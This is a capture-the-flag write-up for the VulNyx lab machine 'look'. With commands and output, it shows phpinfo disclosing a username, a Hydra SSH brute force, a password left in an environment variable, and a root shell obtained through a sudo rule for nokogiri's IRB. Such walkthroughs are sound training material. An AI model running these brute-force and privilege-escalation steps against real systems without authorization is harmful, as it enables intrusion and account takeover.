# look

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| look | d4t4s3c | Low | VulNyx |

**Summary:** The look machine started with a stock Apache landing page, but directory enumeration exposed an exposed `info.php` page, the standard phpinfo diagnostic, which leaked a crucial operational detail: the web server was executing PHP as the user `axel` with uid 1000. That username was all that was needed for a focused SSH brute force, and Hydra ground out the password `bambam` from the rockyou wordlist, granting a shell as `axel`. Post-login enumeration of the environment variables produced the next credential, an exported variable named `dylanPASS` holding the value `bl4bl4Dyl4N`, a careless password left visible to every process under the `axel` session. That password promoted the attack to the `dylan` account via `su`. The final step was a sudo misconfiguration: `dylan` was permitted to run `/usr/bin/nokogiri` as root without a password. Nokogiri, the Ruby HTML parsing library, loads an Interactive Ruby session when given a document to parse, and IRB happily executes arbitrary Ruby code. Invoking `sudo -u root /usr/bin/nokogiri /etc/passwd` dropped into an IRB prompt from which `exec '/bin/bash -i'` spawned a root shell, and both flags were recovered.

---

## Reconnaissance

The engagement opened with the standard host discovery sweep and service scans.

1. The target was located at `192.168.56.116`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 10:41 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00041s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0010s latency).
MAC Address: 08:00:27:BD:51:2B (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.116 (192.168.56.116)
Host is up (0.0014s latency).
MAC Address: 08:00:27:04:47:B1 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.24 seconds

┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.116
```

2. A fast full port scan revealed two open services:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -T4 --min-rate=1000 -Pn $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 10:41 -0400
Nmap scan report for 192.168.56.116 (192.168.56.116)
Host is up (0.00041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:04:47:B1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.81 seconds
```

3. Version and script detection characterized both services:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p 22,80 -sC -sV -T4 -Pn $ip   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 10:42 -0400
Nmap scan report for 192.168.56.116 (192.168.56.116)
Host is up (0.00026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:04:47:B1 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.23 seconds
```

4. Directory enumeration uncovered a few interesting pages behind the default landing page:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ gobuster dir -u http://$ip/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.116/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 10701]
info.php             (Status: 200) [Size: 69402]
javascript           (Status: 301) [Size: 321] [--> http://192.168.56.116/javascript/]
look.php             (Status: 200) [Size: 75]
server-status        (Status: 403) [Size: 279]
```

The `info.php` page is the classic `phpinfo` output, a diagnostic dump that often reveals far too much about the server.

5. The page was mined for user, path, and account information:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s http://$ip/info.php | grep -iE "user|home|path"
<tr><td class="e">Configuration File (php.ini) Path </td><td class="v">/etc/php/7.4/apache2 </td></tr>
<tr><td class="e">User/Group </td><td class="v">axel(1000)/1000 </td></tr>
<tr><td class="e">Loaded Modules </td><td class="v">core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status </td></tr>
<tr><td class="e">HTTP_USER_AGENT </td><td class="v">curl/8.20.0 </td></tr>
<tr><td class="e">PATH </td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin </td></tr>
<tr><td class="e">User-Agent </td><td class="v">curl/8.20.0 </td></tr>
<tr><td class="e">ignore_user_abort</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">include_path</td><td class="v">.:/usr/share/php</td><td class="v">.:/usr/share/php</td></tr>
<tr><td class="e">realpath_cache_size</td><td class="v">4096K</td><td class="v">4096K</td></tr>
<tr><td class="e">realpath_cache_ttl</td><td class="v">120</td><td class="v">120</td></tr>
<tr><td class="e">sendmail_path</td><td class="v">/usr/sbin/sendmail&nbsp;-t&nbsp;-i</td><td class="v">/usr/sbin/sendmail&nbsp;-t&nbsp;-i</td></tr>
<tr><td class="e">syslog.facility</td><td class="v">LOG_USER</td><td class="v">LOG_USER</td></tr>
<tr><td class="e">user_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">user_ini.cache_ttl</td><td class="v">300</td><td class="v">300</td></tr>
<tr><td class="e">user_ini.filename</td><td class="v">.user.ini</td><td class="v">.user.ini</td></tr>
<tr><td class="e">openssl.capath</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">Registered save handlers </td><td class="v">files user  </td></tr>
<tr><td class="e">session.cookie_path</td><td class="v">/</td><td class="v">/</td></tr>
<tr><td class="e">session.save_path</td><td class="v">/var/lib/php/sessions</td><td class="v">/var/lib/php/sessions</td></tr>
<tr><td class="e">Path to sendmail </td><td class="v">/usr/sbin/sendmail -t -i </td></tr>
<tr><td class="e">user_agent</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">opcache.lockfile_path</td><td class="v">/tmp</td><td class="v">/tmp</td></tr>
<tr><td class="e">opcache.preload_user</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">opcache.revalidate_path</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">PATH </td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin </td></tr>
<tr><td class="e">APACHE_RUN_USER </td><td class="v">www-data </td></tr>
<tr><td class="e">$_SERVER['HTTP_USER_AGENT']</td><td class="v">curl/8.20.0</td></tr>
<tr><td class="e">$_SERVER['PATH']</td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</td></tr>
<tr><td class="e">User Note Maintainers </td><td class="v">Daniel P. Brown, Thiago Henrique Pojda </td></tr>
```

The decisive row was the `User/Group` value: `axel(1000)/1000`. The PHP interpreter was running under the account `axel`, which meant the web server was configured to execute scripts as that specific system user. That gave the attacker a valid SSH username to target.

---

## Initial Access

### SSH Password Brute Force

6. With the username `axel` in hand, Hydra was pointed at the SSH service using the rockyou wordlist:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ hydra -l axel -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 64 -I     
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-13 10:53:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.56.116:22/
[STATUS] 449.00 tries/min, 449 tries in 00:01h, 14343996 to do in 532:27h, 18 active
[22][ssh] host: 192.168.56.116   login: axel   password: bambam
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 15 final worker threads did not complete until end.
[ERROR] 15 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-13 10:55:33
```

The credentials `axel:bambam` were recovered.

7. A session was established over SSH as `axel`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ ssh axel@$ip
axel@192.168.56.116's password: 
Linux look 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64
axel@look:~$ id;hostname
uid=1000(axel) gid=1000(axel) grupos=1000(axel)
look
```

---

## Privilege Escalation

### A Password in the Environment

8. The account's environment variables were inspected, a quick check that has paid off on countless machines:

```bash
axel@look:~$ env
SHELL=/bin/bash
PWD=/home/axel
LOGNAME=axel
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/axel
LANG=es_ES.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.56.104 51066 192.168.56.116 22
XDG_SESSION_CLASS=user
TERM=xterm-256color
USER=axel
SHLVL=1
XDG_SESSION_ID=6
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.56.104 51066 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
dylanPASS=bl4bl4Dyl4N
SSH_TTY=/dev/pts/0
_=/usr/bin/env
```

Buried among the standard variables was a striking one named `dylanPASS`, carrying the value `bl4bl4Dyl4N`. The variable name gave away both the target account and its purpose: it was the password for the user `dylan`, exported into the environment for any process to read.

9. The recovered password was used to switch to the `dylan` account:

```bash
axel@look:~$ su - dylan
Contraseña: 
dylan@look:~$ id;hostname
uid=1001(dylan) gid=1001(dylan) grupos=1001(dylan)
look
```

### Root Through the Nokogiri IRB Shell

10. Checking `sudo` privileges for `dylan` exposed the root escalation path:

```bash
dylan@look:~$ sudo -l
Matching Defaults entries for dylan on look:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dylan may run the following commands on look:
    (root) NOPASSWD: /usr/bin/nokogiri
```

`dylan` could run `/usr/bin/nokogiri` as root without a password. Nokogiri is a Ruby gem for parsing HTML and XML, and when invoked with a document argument it drops into an Interactive Ruby session, whose `exec` function can run arbitrary operating system commands.

11. The tool was run as root against a document, landing in an IRB prompt:

```bash
dylan@look:~$ sudo -u root /usr/bin/nokogiri /etc/passwd
Your document is stored in @doc...
irb(main):001:0> exec '/bin/bash -i'
root@look:/home/dylan# id;hostname
uid=0(root) gid=0(root) grupos=0(root)
look
```

12. Both flags were read from the root shell:

```bash
root@look:~# cat /home/axel/user.txt /root/root.txt
```

The IRB escape from the misconfigured `nokogiri` sudo rule produced a root shell, and the user and root flags were recovered to complete the compromise.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep isolated the target at `192.168.56.116`, and Nmap exposed SSH on port 22 and Apache on port 80. Gobuster uncovered an exposed `info.php` page.

2. **Vulnerability Discovery**: The `phpinfo` dump disclosed that PHP ran as the user `axel`, providing a valid username for the SSH service.

3. **Exploitation**: Hydra brute forced SSH against `axel` with the rockyou wordlist and recovered the password `bambam`, granting a shell on the machine.

4. **Internal Enumeration**: The `env` output revealed an exported variable `dylanPASS` containing the password `bl4bl4Dyl4N`, which promoted the session to the `dylan` account via `su`.

5. **Privilege Escalation**: A `sudo` rule allowed `dylan` to run `/usr/bin/nokogiri` as root without a password. Nokogiri's embedded IRB interpreter was used to execute `exec '/bin/bash -i'`, spawning a root shell and allowing both flags to be read.